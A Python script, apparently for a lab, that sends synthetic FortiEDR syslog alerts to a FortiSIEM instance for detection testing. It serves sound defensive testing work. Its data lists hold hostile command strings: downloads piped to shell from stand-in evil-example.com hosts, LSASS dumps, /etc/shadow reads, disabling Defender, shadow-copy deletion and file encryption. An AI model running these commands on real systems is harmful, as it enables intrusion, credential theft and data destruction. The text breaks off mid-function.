#!/usr/bin/env python3
"""
FortiEDR Extended TTP Simulator -> FortiSIEM via Scapy

Synthetic FortiEDR syslog generator aligned with the FortiSIEM FortiEDR parser:
  <PRI>1 2026-05-03T12:00:00.000+02:00 <reporting-name> FortiEDR <tok1> <tok2> <tok3> Action: Block;Classification: Malicious;...

The body uses key-value pairs with kvsep ': ' and sep ';'.
No real malware, commands, or endpoint actions are executed; only syslog packets are sent.
"""

from __future__ import annotations

import argparse
import csv
import ipaddress
import json
import random
import re
import signal
import time
from datetime import datetime, timezone, timedelta
from pathlib import Path
from typing import Any

from scapy.all import IP, UDP, Raw, send

# =====================
# EDITABLE CONSTANTS
# =====================
DEFAULT_FORTISIEM_IP = "10.255.9.3"
DEFAULT_DATA_DIR = Path("/root/escenarios/instrumentacion")
USERS_FILE_PATH = DEFAULT_DATA_DIR / "ad_users.csv"
MALWARE_FILE_PATH = DEFAULT_DATA_DIR / "malware_samples.csv"
C2_FILE_PATH = DEFAULT_DATA_DIR / "c2_indicators.txt"
ATTACKERS_FILE_PATH = DEFAULT_DATA_DIR / "attackers.txt"
PROCESSES_FILE_PATH = DEFAULT_DATA_DIR / "processes.csv"
C2_DOMAINS_FILE_PATH = DEFAULT_DATA_DIR / "c2_domains.txt"
C2_ROUTES_FILE_PATH = DEFAULT_DATA_DIR / "c2_routes.txt"
EXTERNAL_NODES_FILE_PATH = DEFAULT_DATA_DIR / "external_nodes.csv"
ENDPOINTS_FILE_PATH = DEFAULT_DATA_DIR / "endpoints.csv"
COMMANDS_FILE_PATH = DEFAULT_DATA_DIR / "command_lines.txt"
REPORTING_POOL_FILE_PATH = DEFAULT_DATA_DIR / "reporting_sources.csv"
DEFAULT_TENANT_ID = "LAB-TENANT-ID"
DEFAULT_TENANT_NAME = "LAB-TENANT"
DEFAULT_EXERCISE_ID = "FORTIEDR-EXTENDED"

VALID_TTPS = [
    "malicious_file", "suspicious_process", "c2", "credential_access",
    "persistence", "defense_evasion", "discovery", "lateral_movement",
    "collection", "exfiltration", "ransomware", "device_isolation",
    "collector_status", "system_login", "all",
]
TTPS_IN_ALL_DEFAULT = [
    "malicious_file", "suspicious_process", "c2", "credential_access",
    "persistence", "defense_evasion", "discovery", "lateral_movement",
    "collection", "exfiltration", "device_isolation", "collector_status",
    "system_login",
]
VALID_ACTIONS = ["Log", "Block", "Quarantine", "Terminate", "Detect", "Isolate"]

DEFAULT_REPORTING_SOURCES = [
    {"ip": "172.16.20.110", "name": "172.16.20.110"},
    {"ip": "172.16.20.111", "name": "FORTIEDR-CM-01"},
    {"ip": "172.16.20.112", "name": "FORTIEDR-CM-02"},
    {"ip": "10.0.20.110", "name": "FEDR-MANAGER-MAD"},
    {"ip": "10.0.20.111", "name": "FEDR-MANAGER-BCN"},
]
DEFAULT_USERS = [
    "corp\\j.garcia", "corp\\m.rodriguez", "corp\\a.sanchez", "corp\\l.martin",
    "corp\\p.lopez", "corp\\c.navarro", "corp\\svc_backup", "corp\\svc_sql",
    "nt authority\\system", "root", "www-data", "postgres", "monitoring", "backup",
]
DEFAULT_ENDPOINTS = [
    {"hostname":"MAD-W11-FIN-014","ip":"10.0.10.30","os":"Windows 11 Pro 23H2","os_family":"windows","group":"Finance Workstations"},
    {"hostname":"MAD-W11-HR-022","ip":"10.0.10.31","os":"Windows 11 Enterprise 23H2","os_family":"windows","group":"HR Workstations"},
    {"hostname":"MAD-W11-IT-041","ip":"10.0.10.41","os":"Windows 11 Pro 23H2","os_family":"windows","group":"IT Workstations"},
    {"hostname":"MAD-SRV-APP-003","ip":"10.0.20.45","os":"Windows Server 2019 Standard","os_family":"windows","group":"Application Servers"},
    {"hostname":"MAD-SRV-FS-001","ip":"10.0.20.50","os":"Windows Server 2022 Standard","os_family":"windows","group":"File Servers"},
    {"hostname":"MAD-LNX-WEB-001","ip":"10.0.30.21","os":"Ubuntu Server 22.04 LTS","os_family":"linux","group":"Linux Web Servers"},
    {"hostname":"MAD-LNX-DB-002","ip":"10.0.30.22","os":"Red Hat Enterprise Linux 9","os_family":"linux","group":"Linux Database Servers"},
    {"hostname":"MAD-LNX-JMP-001","ip":"10.0.30.10","os":"Ubuntu Server 22.04 LTS","os_family":"linux","group":"Jump Servers"},
    {"hostname":"BCN-LNX-DOCKER-001","ip":"10.1.30.40","os":"Debian GNU/Linux 12","os_family":"linux","group":"Container Hosts"},
]
DEFAULT_MALWARE = [
    {"name":"W32/Agent.AFD!tr","family":"Agent","type":"Trojan"},
    {"name":"W64/GenKryptik.AJ!tr","family":"Kryptik","type":"Trojan"},
    {"name":"MSIL/Kryptik.ACY!tr","family":"Kryptik","type":"Trojan"},
    {"name":"Riskware/PowerShell.Downloader","family":"PowerShell","type":"Riskware"},
    {"name":"Suspicious/EncodedPowerShell","family":"PowerShell","type":"Suspicious"},
    {"name":"Trojan/Win32.RedLineStealer","family":"RedLine","type":"Credential Theft"},
    {"name":"Backdoor/Win32.AsyncRAT","family":"AsyncRAT","type":"Backdoor"},
    {"name":"Linux/Backdoor.Gafgyt","family":"Gafgyt","type":"Backdoor"},
    {"name":"Linux/CoinMiner.A","family":"CoinMiner","type":"CoinMiner"},
    {"name":"Malware/Generic.AI.Detected","family":"Generic","type":"Malware"},
]
DEFAULT_C2 = [
    {"ip":"45.83.120.10","domain":"update-checkin-cdn.evil-example.com","country":"NL","asn":"AS9009"},
    {"ip":"91.199.212.44","domain":"api-sync-service.evil-example.com","country":"DE","asn":"AS12389"},
    {"ip":"185.203.118.77","domain":"cdn-telemetry-cache.evil-example.com","country":"FR","asn":"AS62044"},
    {"ip":"193.56.29.101","domain":"edge-service-updater.evil-example.com","country":"RO","asn":"AS210558"},
]

DEFAULT_C2_ROUTES = [
    "/checkin",
    "/api/v1/session",
    "/api/v2/telemetry",
    "/cdn/update",
    "/download/a.dat",
    "/upload",
    "/beacon",
    "/gate.php",
    "/panel/task",
]

DEFAULT_EXTERNAL_NODES = [
    {"ip": "45.83.120.10", "name": "update-checkin-cdn.evil-example.com", "role": "c2", "country": "NL", "asn": "AS9009"},
    {"ip": "91.199.212.44", "name": "api-sync-service.evil-example.com", "role": "c2", "country": "DE", "asn": "AS12389"},
    {"ip": "185.203.118.77", "name": "cdn-telemetry-cache.evil-example.com", "role": "exfil", "country": "FR", "asn": "AS62044"},
    {"ip": "193.56.29.101", "name": "edge-service-updater.evil-example.com", "role": "staging", "country": "RO", "asn": "AS210558"},
    {"ip": "198.51.100.25", "name": "backup-sync-node.example.net", "role": "exfil", "country": "US", "asn": "AS64500"},
]
WINDOWS_PATHS = [
    r"C:\Users\Public\Documents\AdobeSync\AdobeUpdate.exe",
    r"C:\Users\Public\sysupdate.exe",
    r"C:\Windows\Temp\7zS4A1.tmp\setup.exe",
    r"C:\ProgramData\Microsoft\Windows\Caches\msedge_update.exe",
    r"C:\Windows\Tasks\OfficeTelemetryAgent.exe",
]
LINUX_PATHS = ["/tmp/.sysupdate", "/tmp/.cache/.x11", "/var/tmp/kworker", "/dev/shm/.dbus-update", "/usr/local/bin/systemd-helper"]
WINDOWS_PROCESSES = [
    ("powershell.exe", r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"),
    ("cmd.exe", r"C:\Windows\System32\cmd.exe"), ("mshta.exe", r"C:\Windows\System32\mshta.exe"),
    ("rundll32.exe", r"C:\Windows\System32\rundll32.exe"), ("regsvr32.exe", r"C:\Windows\System32\regsvr32.exe"),
    ("certutil.exe", r"C:\Windows\System32\certutil.exe"), ("bitsadmin.exe", r"C:\Windows\System32\bitsadmin.exe"),
    ("schtasks.exe", r"C:\Windows\System32\schtasks.exe"), ("reg.exe", r"C:\Windows\System32\reg.exe"),
]
LINUX_PROCESSES = [("bash","/bin/bash"),("sh","/bin/sh"),("curl","/usr/bin/curl"),("wget","/usr/bin/wget"),("python3","/usr/bin/python3"),("systemctl","/bin/systemctl"),("crontab","/usr/bin/crontab"),("tar","/bin/tar"),("find","/usr/bin/find"),("ssh","/usr/bin/ssh")]
WINDOWS_COMMANDS = [
    r"powershell.exe -NoProfile -EncodedCommand <redacted>",
    r"powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command Write-Output PS ATTACK!!!",
    r"cmd.exe /c whoami && hostname && ipconfig /all",
    r"mshta.exe http://edge-service-updater.evil-example.com/update.hta",
    r"regsvr32.exe /s /n /u /i:http://api-sync-service.evil-example.com/scrobj.sct scrobj.dll",
    r"rundll32.exe C:\Users\Public\Documents\AdobeSync\AdobeUpdate.dll,Start",
    r"certutil.exe -urlcache -split -f http://cdn-telemetry-cache.evil-example.com/file.dat C:\Windows\Temp\7zS4A1.tmp\setup.exe",
    r"bitsadmin.exe /transfer UpdaterJob http://update-checkin-cdn.evil-example.com/update.bin C:\Users\Public\update.bin",
    r"schtasks.exe /Create /TN OfficeTelemetryAgent /SC MINUTE /MO 30 /TR C:\Windows\Tasks\OfficeTelemetryAgent.exe",
    r"reg.exe add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v OneDriveUpdate /d C:\Users\Public\Documents\AdobeSync\AdobeUpdate.exe /f",
    r"net use \\10.0.20.50\C$ /user:corp\svc_backup",
    r"powershell.exe Compress-Archive -Path C:\Shares\Finance\*.xlsx -DestinationPath C:\Windows\Temp\finance.zip",
]
LINUX_COMMANDS = [
    "bash -c curl http://update-checkin-cdn.evil-example.com/payload.sh | sh",
    "wget -q http://api-sync-service.evil-example.com/init -O /tmp/.cache/.x11",
    "chmod +x /tmp/.sysupdate && /tmp/.sysupdate --silent",
    "crontab -l; echo '*/15 * * * * /tmp/.sysupdate --beacon' | crontab -",
    "systemctl enable systemd-helper.service", "cat /etc/shadow", "tar -czf /tmp/ssh_keys.tgz /home/*/.ssh",
    "find /home -name '*.xlsx'", "scp /tmp/.sysupdate root@10.0.30.22:/tmp/",
]
RANSOM_CMDS = {
    "windows": {
        "low": [r"powershell.exe Get-ChildItem C:\Shares -Recurse -Include *.xlsx"],
        "medium": [r"vssadmin.exe List Shadows", r"powershell.exe Get-ChildItem C:\Shares -Recurse | Rename-Item -NewName {$_.Name + '.locked'}"],
        "high": [r"vssadmin.exe Delete Shadows /All /Quiet", r"wbadmin.exe delete catalog -quiet", r"powershell.exe Get-ChildItem C:\Shares -Recurse | Rename-Item -NewName {$_.Name + '.encrypted'}"],
    },
    "linux": {
        "low": ["find /srv/finance -type f -name '*.xlsx'"],
        "medium": ["openssl enc -aes-256-cbc -in /srv/finance/report.xlsx -out /srv/finance/report.xlsx.encrypted"],
        "high": ["find /srv/finance -type f -exec openssl enc -aes-256-cbc -in {} -out {}.encrypted \\;", "rm -rf /backup/snapshots/*"],
    }
}

RUNNING = True

def stop_handler(signum, frame):
    global RUNNING
    RUNNING = False
    print("\n[!] Deteniendo simulador...")

signal.signal(signal.SIGINT, stop_handler)
signal.signal(signal.SIGTERM, stop_handler)

# ---------- loaders ----------
def existing_file(v: str | None) -> Path | None:
    if not v:
        return None
    p = Path(v)
    return p if p.exists() and p.is_file() else None

def txt_lines(p: Path) -> list[str]:
    return [x.strip() for x in p.read_text(encoding="utf-8-sig", errors="replace").splitlines() if x.strip() and not x.strip().startswith("#")]

def sniff_delimiter(sample: str) -> str:
    if sample.count(";") >= sample.count(",") and ";" in sample:
        return ";"
    return ","

def csv_rows(p: Path) -> list[dict[str, str]]:
    text = p.read_text(encoding="utf-8-sig", errors="replace")
    non_comment = "\n".join([ln for ln in text.splitlines() if ln.strip() and not ln.lstrip().startswith("#")])
    if not non_comment:
        return []
    delim = sniff_delimiter(non_comment[:2048])
    from io import StringIO
    return list(csv.DictReader(StringIO(non_comment), delimiter=delim))

def split_loose(line: str) -> list[str]:
    # Soporta: valor, valor;score, ip,domain,country,asn e ip;name;role
    return [p.strip() for p in re.split(r"[;,]", line.strip()) if p.strip()]

def is_ip(value: str) -> bool:
    try:
        ipaddress.ip_address(value)
        return True
    except Exception:
        return False

def is_domain(value: str) -> bool:
    return bool(re.match(r"^(?=.{1,253}$)(?!-)[A-Za-z0-9_.-]+\.[A-Za-z]{2,}$", value or ""))

def normalize_domain_from_upn(upn: str, default: str = "corp") -> str:
    if "@" not in upn:
        return default
    domain_part = upn.split("@", 1)[1]
    return (domain_part.split(".", 1)[0] or default).upper()

def load_users(path: str | None) -> list[str]:
    """
    Soporta tu ad.csv real:
      n.pistacho;n.pistacho@age.local;S-1-5-21-...-1101
    También soporta CSV con cabeceras domain,user / username / samAccountName / upn.
    """
    p = existing_file(path)
    if not p:
        return DEFAULT_USERS[:]

    lines = txt_lines(p)
    if not lines:
        return DEFAULT_USERS[:]

    # Formato sin cabecera separado por ';': sam;upn;sid
    first = lines[0].lower()
    header_words = ("user", "username", "samaccountname", "domain", "upn", "sid")
    if ";" in lines[0] and not any(w in first for w in header_words):
        out = []
        for line in lines:
            parts = [x.strip() for x in line.split(";")]
            if not parts or not parts[0]:
                continue
            sam = parts[0]
            upn = parts[1] if len(parts) > 1 else ""
            domain = normalize_domain_from_upn(upn, "corp")
            out.append(f"{domain}\\{sam}")
        return out or DEFAULT_USERS[:]

    if p.suffix.lower() == ".csv":
        out = []
        for r in csv_rows(p):
            domain = r.get("domain") or r.get("Domain") or r.get("DOMAIN") or "corp"
            user = r.get("user") or r.get("username") or r.get("samAccountName") or r.get("sAMAccountName") or r.get("sam")
            upn = r.get("upn") or r.get("userPrincipalName") or r.get("mail") or r.get("email")
            if user and "\\" in user:
                out.append(user)
            elif user:
                out.append(f"{domain}\\{user}")
            elif upn and "@" in upn:
                out.append(f"{normalize_domain_from_upn(upn)}\\{upn.split('@', 1)[0]}")
        return out or DEFAULT_USERS[:]

    return lines or DEFAULT_USERS[:]

def load_malware(path: str | None) -> list[dict[str, str]]:
    p = existing_file(path)
    if not p:
        return DEFAULT_MALWARE[:]
    if p.suffix.lower() == ".json":
        data = json.loads(p.read_text(encoding="utf-8-sig"))
        return data if isinstance(data, list) else DEFAULT_MALWARE[:]
    if p.suffix.lower() == ".csv":
        out = []
        for r in csv_rows(p):
            name = r.get("name") or r.get("malware_name") or r.get("Threat Name") or r.get("threat_name") or r.get("malware")
            fam = r.get("family") or r.get("Threat Family") or r.get("threat_family") or "Generic"
            typ = r.get("type") or r.get("Threat Type") or r.get("threat_type") or "Malware"
            if name:
                out.append({"name": name, "family": fam, "type": typ})
        return out or DEFAULT_MALWARE[:]
    out = []
    for line in txt_lines(p):
        parts = split_loose(line)
        if not parts:
            continue
        out.append({"name": parts[0], "family": parts[1] if len(parts) > 1 else "Generic", "type": parts[2] if len(parts) > 2 else "Malware"})
    return out or DEFAULT_MALWARE[:]

def indicator_to_c2(value: str, extra: list[str] | None = None) -> dict[str, str] | None:
    value = value.strip()
    if not value or value.isdigit():
        return None
    extra = extra or []
    score = next((x for x in extra if x.isdigit()), "")
    if is_ip(value):
        return {"ip": value, "domain": f"host-{value.replace('.', '-')}.external", "country": "N/A", "asn": "N/A", "score": score}
    if is_domain(value):
        # Si el segundo campo es IP, úsalo. Si no, IP placeholder controlada.
        ip = next((x for x in extra if is_ip(x)), "93.184.216.34")
        return {"ip": ip, "domain": value, "country": "N/A", "asn": "N/A", "score": score}
    return None

def load_c2(path: str | None) -> list[dict[str, str]]:
    """Soporta TXT con IP/dominio por línea y casos tipo '176.123.5.126;65'."""
    p = existing_file(path)
    if not p:
        return DEFAULT_C2[:]
    if p.suffix.lower() == ".json":
        data = json.loads(p.read_text(encoding="utf-8-sig"))
        return data if isinstance(data, list) else DEFAULT_C2[:]
    if p.suffix.lower() == ".csv":
        out = []
        rows = csv_rows(p)
        if rows:
            for r in rows:
                ip = r.get("ip") or r.get("c2_ip") or r.get("IP") or r.get("dst_ip") or r.get("address")
                domain = r.get("domain") or r.get("c2_domain") or r.get("hostname") or r.get("name") or ip
                if ip or domain:
                    out.append({"ip": ip or "93.184.216.34", "domain": domain or "unknown.example.net", "country": r.get("country") or "N/A", "asn": r.get("asn") or "N/A", "score": r.get("score") or ""})
            if out:
                return out
    out = []
    seen = set()
    for line in txt_lines(p):
        parts = split_loose(line)
        if not parts:
            continue
        item = indicator_to_c2(parts[0], parts[1:])
        if item:
            key = (item["ip"], item["domain"])
            if key not in seen:
                seen.add(key)
                out.append(item)
    return out or DEFAULT_C2[:]


def load_c2_domains(path: str | None, base_c2: list[dict[str, str]]) -> list[dict[str, str]]:
    """Añade dominios/IPs C2 desde TXT/CSV. Soporta tu c2c.txt con líneas dominio, IP o IP;score."""
    p = existing_file(path)
    out = [x.copy() for x in base_c2]
    seen = {(x.get("ip"), x.get("domain")) for x in out}
    if not p:
        return out
    extra = load_c2(str(p))
    for item in extra:
        key = (item.get("ip"), item.get("domain"))
        if key not in seen:
            seen.add(key)
            out.append(item)
    return out


def load_c2_routes(path: str | None) -> list[str]:
    p = existing_file(path)
    if not p:
        return DEFAULT_C2_ROUTES[:]
    if p.suffix.lower() == ".csv":
        out = []
        for r in csv_rows(p):
            value = r.get("route") or r.get("path") or r.get("uri") or r.get("url_path")
            if value:
                out.append(value if value.startswith("/") else "/" + value)
        return out or DEFAULT_C2_ROUTES[:]
    out = []
    for line in txt_lines(p):
        first = split_loose(line)[0] if split_loose(line) else ""
        if first:
            out.append(first if first.startswith("/") else "/" + first)
    return out or DEFAULT_C2_ROUTES[:]


def load_attackers(path: str | None) -> list[str]:
    """Carga attackers.txt: una IP por línea. Ignora líneas numéricas tipo separador/score."""
    p = existing_file(path)
    if not p:
        return [x["ip"] for x in DEFAULT_C2]
    out = []
    seen = set()
    for line in txt_lines(p):
        for part in split_loose(line):
            if is_ip(part) and part not in seen:
                seen.add(part)
                out.append(part)
    return out or [x["ip"] for x in DEFAULT_C2]


def load_external_nodes(path: str | None) -> list[dict[str, str]]:
    """Inventario de nodos externos. También acepta attackers.txt como lista simple de IPs."""
    p = existing_file(path)
    if not p:
        return DEFAULT_EXTERNAL_NODES[:]
    if p.suffix.lower() == ".json":
        data = json.loads(p.read_text(encoding="utf-8-sig"))
        return data if isinstance(data, list) else DEFAULT_EXTERNAL_NODES[:]
    if p.suffix.lower() == ".csv":
        out = []
        rows = csv_rows(p)
        for r in rows:
            ip = r.get("ip") or r.get("IP") or r.get("address")
            name = r.get("name") or r.get("hostname") or r.get("domain") or ip
            role = r.get("role") or r.get("type") or "external"
            if ip or name:
                out.append({"ip": ip or "93.184.216.34", "name": name or ip or "external-node", "role": role, "country": r.get("country") or "N/A", "asn": r.get("asn") or "N/A"})
        if out:
            return out
    out = []
    seen = set()
    for line in txt_lines(p):
        parts = split_loose(line)
        if not parts:
            continue
        value = parts[0]
        if value.isdigit():
            continue
        if is_ip(value):
            ip = value
            name = parts[1] if len(parts) > 1 and is_domain(parts[1]) else f"node-{value.replace('.', '-')}.external"
        elif is_domain(value):
            name = value
            ip = next((x for x in parts[1:] if is_ip(x)), "93.184.216.34")
        else:
            continue
        if (ip, name) in seen:
            continue
        seen.add((ip, name))
        role = parts[2] if len(parts) > 2 and not parts[2].isdigit() else "external"
        out.append({"ip": ip, "name": name, "role": role, "country": "N/A", "asn": "N/A"})
    return out or DEFAULT_EXTERNAL_NODES[:]

def load_endpoints(path: str | None) -> list[dict[str, str]]:
    p = existing_file(path)
    if not p:
        return DEFAULT_ENDPOINTS[:]
    if p.suffix.lower() == ".json":
        data = json.loads(p.read_text(encoding="utf-8-sig"))
        return data if isinstance(data, list) else DEFAULT_ENDPOINTS[:]
    if p.suffix.lower() == ".csv":
        out = []
        for r in csv_rows(p):
            host = r.get("hostname") or r.get("host") or r.get("Device Name") or r.get("name")
            ip = r.get("ip") or r.get("Source IP") or r.get("host_ip") or r.get("address")
            osn = r.get("os") or r.get("Operating System") or "Windows 11 Pro 23H2"
            fam = (r.get("os_family") or "").lower() or ("linux" if any(x in osn.lower() for x in ["linux", "ubuntu", "debian", "red hat", "rocky"]) else "windows")
            group = r.get("group") or r.get("Group") or "Endpoints"
            if host and ip:
                out.append({"hostname": host, "ip": ip, "os": osn, "os_family": fam, "group": group})
        return out or DEFAULT_ENDPOINTS[:]
    return DEFAULT_ENDPOINTS[:]

def load_processes(path: str | None) -> dict[str, list[tuple[str, str]]]:
    """
    Soporta tu processes.csv real:
      #os;process_name;absolute_path
      Windows;powershell.exe;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
    """
    p = existing_file(path)
    if not p:
        return {"windows": WINDOWS_PROCESSES[:], "linux": LINUX_PROCESSES[:]}
    out = {"windows": [], "linux": []}
    for line in txt_lines(p):
        parts = [x.strip() for x in line.split(";")]
        if len(parts) < 3:
            parts = [x.strip() for x in line.split(",")]
        if len(parts) < 3:
            continue
        osname, pname, ppath = parts[0], parts[1], parts[2]
        fam = "linux" if osname.lower().startswith(("linux", "ubuntu", "debian", "rhel", "red", "rocky")) else "windows"
        out[fam].append((pname, ppath))
    if not out["windows"]:
        out["windows"] = WINDOWS_PROCESSES[:]
    if not out["linux"]:
        out["linux"] = LINUX_PROCESSES[:]
    return out

def load_commands(path: str | None) -> list[str]:
    p = existing_file(path)
    return txt_lines(p) if p else []

def load_reporting(path: str | None) -> list[dict[str, str]]:
    p = existing_file(path)
    if not p:
        return DEFAULT_REPORTING_SOURCES[:]
    if p.suffix.lower() == ".csv":
        out = []
        for r in csv_rows(p):
            ip = r.get("ip") or r.get("reporting_ip") or r.get("IP")
            name = r.get("name") or r.get("reporting_name") or r.get("hostname") or ip
            if ip:
                out.append({"ip": ip, "name": name})
        return out or DEFAULT_REPORTING_SOURCES[:]
    out = []
    for line in txt_lines(p):
        parts = split_loose(line)
        if parts and is_ip(parts[0]):
            out.append({"ip": parts[0], "name": parts[1] if len(parts) > 1 else parts[0]})
    return out or DEFAULT_REPORTING_SOURCES[:]

# ---------- utilities ----------
def rfc5424_ts(offset: int) -> str:
    now = datetime.now(timezone(timedelta(hours=offset)))
    return now.strftime("%Y-%m-%dT%H:%M:%S.") + f"{now.microsecond // 1000:03d}" + now.strftime("%z")[:3] + ":" + now.strftime("%z")[3:]

def mac() -> str:
    return "02:%02x:%02x:%02x:%02x:%02x" % tuple(random.randint(0,255) for _ in range(5))

def h256() -> str:
    return f"{random.getrandbits(256):064x}"

def clean(v: Any) -> str:
    return str(v).replace(";", ",").replace("\n", " ").replace("\r", " ")

def body_kv(**kw: Any) -> str:
    return "".join(f"{k}: {clean(v)};" for k, v in kw.items() if v is not None)

def pick_ep(data: dict, os_filter: str) -> dict:
    eps = [e for e in data["endpoints"] if os_filter == "any" or e.get("os_family") == os_filter] or data["endpoints"]
    ep = random.choice(eps).copy()
    win_users = [u for u in data["users"] if "\\" in u and not u.lower().startswith("nt authority")]
    lin_users = [u for u in data["users"] if "\\" not in u or u in ["root", "www-data", "postgres", "monitoring", "backup"]]
    ep["user"] = random.choice(win_users if ep.get("os_family") == "windows" and win_users else lin_users or data["users"])
    ep["mac"] = mac()
    return ep

def pick_proc(ep: dict, data: dict | None = None) -> tuple[str, str]:
    if data and data.get("processes"):
        fam = "windows" if ep.get("os_family") == "windows" else "linux"
        pool = data["processes"].get(fam) or []
        if pool:
            return random.choice(pool)
    return random.choice(WINDOWS_PROCESSES if ep.get("os_family") == "windows" else LINUX_PROCESSES)

def pick_path(ep: dict) -> str:
    return random.choice(WINDOWS_PATHS if ep.get("os_family") == "windows" else LINUX_PATHS)

def pick_cmd(ep: dict, data: dict) -> str:
    if data.get("commands"):
        return random.choice(data["commands"])
    return random.choice(WINDOWS_COMMANDS if ep.get("os_family") == "windows" else LINUX_COMMANDS)


def pick_c2_route(data: dict) -> str:
    return random.choice(data.get("c2_routes") or DEFAULT_C2_ROUTES)


def pick_external_node(data: dict, role: str | None = None) -> dict[str, str]:
    nodes = data.get("external_nodes") or DEFAULT_EXTERNAL_NODES
    if role:
        filtered = [n for n in nodes if n.get("role") == role]
        if filtered:
            return random.choice(filtered)
    return random.choice(nodes)


def pick_c2_target(data: dict, args=None, prefer_external: bool = False) -> dict[str, str]:
    """Devuelve destino con ip/domain/country/asn. Puede venir de C2 o external_nodes."""
    use_external = prefer_external or (args is not None and args.use_external_nodes and random.random() < args.external_node_ratio)
    if use_external and data.get("external_nodes"):
        node = pick_external_node(data)
        return {"ip": node.get("ip", "93.184.216.34"), "domain": node.get("name", node.get("ip", "external-node")), "country": node.get("country", "N/A"), "asn": node.get("asn", "N/A"), "role": node.get("role", "external")}
    return random.choice(data["c2"])

def pick_reporting(args, data: dict) -> dict:
    if args.reporting_mode == "fixed":
        return {"ip": args.reporting_ip, "name": args.reporting_name or args.reporting_ip}
    return random.choice(data["reporting"])

def syslog_msg(args, reporting: dict, body: str) -> str:
    return f"{args.pri}1 {rfc5424_ts(args.tz_offset)} {reporting['name']} FortiEDR Security Alert 1 {body}"

def send_msg(args, reporting: dict, body: str):
    raw = syslog_msg(args, reporting, body)
    packet = IP(src=reporting["ip"], dst=args.fortisiem_ip) / UDP(sport=random.randint(20000,65000), dport=args.port) / Raw(load=raw.encode())
    send(packet, verbose=False)

# ---------- event generation ----------
def choose_action(args, prefer: str | None = None) -> str:
    if prefer and prefer in args.actions:
        return prefer
    return random.choice(args.actions)

def pick_remote_ip(args, data: dict, fallback: str) -> str:
    attackers = data.get("attackers") or []
    ratio = getattr(args, "attacker_remote_ratio", 0.0)
    if attackers and random.random() < ratio:
        return random.choice(attackers)
    return fallback

def base(args, data, ep, ttp: str, desc: str, action: str, classification: str, command: str | None = None, dest: str | None = None, remote: str | None = None, malware: dict | None = None, status: str | None = None, count: int | None = None) -> dict:
    proc, proc_path = pick_proc(ep, data)
    c2 = random.choice(data["c2"])
    mw = malware or random.choice(data["malware"])
    return {
        "Action": action, "Certificate": random.choice(["Signed", "Unsigned", "Invalid", "N/A"]),
        "Classification": classification, "Count": count or random.randint(1,5), "Country": c2.get("country", "N/A"),
        "Description": desc, "Destination": dest if dest is not None else c2.get("ip"), "Script": pick_path(ep),
        "Device Name": ep["hostname"], "Event ID": f"FEDR-{random.randint(10000000,99999999)}", "MAC Address": ep["mac"],
        "Operating System": ep["os"], "Organization ID": args.tenant_id, "Organization": args.tenant_name,
        "Process Name": proc, "Process Path": proc_path, "Raw Data ID": f"RAW-{random.randint(10000000,99999999)}",
        "Rules List": random.choice(["Execution Prevention", "Ransomware Prevention", "Communication Control", "Suspicious Script Control", "File Reputation", "Behavioral Analysis", "Collector Health"]),
        "Sub-system": random.choice(["Prevention", "Post-Execution", "Communication Control", "Collector"]),
        "Users": ep["user"], "User Name": ep["user"], "Device State": status or random.choice(["Running", "Protected", "Online"]),
        "First Seen": datetime.now().strftime("%d-%b-%Y, %H:%M:%S"), "Last Seen": datetime.now().strftime("%d-%b-%Y, %H:%M:%S"),
        "Process Hash": h256(), "Source IP": ep["ip"], "Script Path": pick_path(ep),
        "Threat Name": mw.get("name"), "Threat Family": mw.get("family"), "Threat Type": mw.get("type"),
        "Remote Connection": remote if remote is not None else pick_remote_ip(args, data, c2.get("ip")), "Autonomous System": c2.get("asn", "N/A"),
        "Command line": command or pick_cmd(ep, data), "Exercise ID": args.exercise_id, "TTP": ttp,
    }

def ev_malicious_file(args, data, ep):
    return body_kv(**base(args, data, ep, "malicious_file", "Malicious file was detected and remediated", choose_action(args, "Block"), "Malicious", command=pick_cmd(ep, data)))

def ev_suspicious_process(args, data, ep):
    return body_kv(**base(args, data, ep, "suspicious_process", "Suspicious process execution was detected", choose_action(args), "Suspicious", command=pick_cmd(ep, data)))

def ev_c2(args, data, ep):
    c2 = pick_c2_target(data, args=args)
    route = pick_c2_route(data)
    proc, _ = pick_proc(ep, data)
    cmd = f"{proc} --connect https://{c2['domain']}{route}"
    fields = base(args, data, ep, "c2", "Outbound connection to suspicious C2 destination was detected", choose_action(args, "Log"), "Suspicious", command=cmd, dest=c2["ip"], remote=c2["ip"])
    fields["Rules List"] = "Communication Control"
    fields["Country"] = c2.get("country", "N/A")
    fields["Autonomous System"] = c2.get("asn", "N/A")
    fields["Destination Domain"] = c2.get("domain")
    fields["URL Path"] = route
    fields["External Node Role"] = c2.get("role", "c2")
    return body_kv(**fields)

def ev_credential_access(args, data, ep):
    cmd = random.choice([r"rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 624 C:\Windows\Temp\lsass.dmp full", r"procdump.exe -ma lsass.exe C:\Windows\Temp\lsass.dmp", "cat /etc/shadow", "tar -czf /tmp/ssh_keys.tgz /home/*/.ssh"])
    fields = base(args, data, ep, "credential_access", "Credential access behavior detected", choose_action(args, "Block"), "Malicious", command=cmd, dest=ep["hostname"], remote=None)
    fields["Threat Family"] = "Credential Access"
    fields["Threat Type"] = "Credential Theft"
    return body_kv(**fields)

def ev_persistence(args, data, ep):
    cmd = random.choice([r"schtasks.exe /Create /TN OfficeTelemetryAgent /SC MINUTE /MO 30 /TR C:\Windows\Tasks\OfficeTelemetryAgent.exe", r"reg.exe add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v OneDriveUpdate /d C:\Users\Public\AdobeUpdate.exe /f", "crontab -l; echo '*/15 * * * * /tmp/.sysupdate --beacon' | crontab -", "systemctl enable systemd-helper.service"])
    return body_kv(**base(args, data, ep, "persistence", "Persistence mechanism creation detected", choose_action(args), "Suspicious", command=cmd))

def ev_defense_evasion(args, data, ep):
    cmd = random.choice(["powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true", "wevtutil cl Security", "history -c", "rm -f /var/log/auth.log"])
    return body_kv(**base(args, data, ep, "defense_evasion", "Defense evasion behavior detected", choose_action(args), "Suspicious", command=cmd))

def ev_discovery(args, data, ep):
    cmd = random.choice(["whoami /all", "net user /domain", "ipconfig /all", "arp -a", "whoami; id; hostname", "ip addr", "cat /etc/passwd"])
